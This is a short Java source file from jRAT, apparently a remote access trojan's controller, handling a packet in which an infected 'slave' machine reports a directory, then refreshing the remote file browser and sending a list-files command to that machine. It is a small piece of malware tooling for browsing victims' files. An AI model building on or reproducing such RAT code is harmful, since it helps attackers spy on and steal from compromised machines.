package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet15ListFiles;
import se.jrat.controller.ui.frames.FrameRemoteFiles;


public class Packet34CustomDirectory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String where = slave.readLine().replace("/", slave.getFileSeparator()).replace("\\", slave.getFileSeparator());

		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
		if (frame != null) {
			frame.getRemoteTable().setDirectory(where);
			while (frame.getRemoteTable().getTableModel().getRowCount() > 0) {
				frame.getRemoteTable().getTableModel().removeRow(0);
			}
			slave.addToSendQueue(new Packet15ListFiles(where));
		}
	}

}
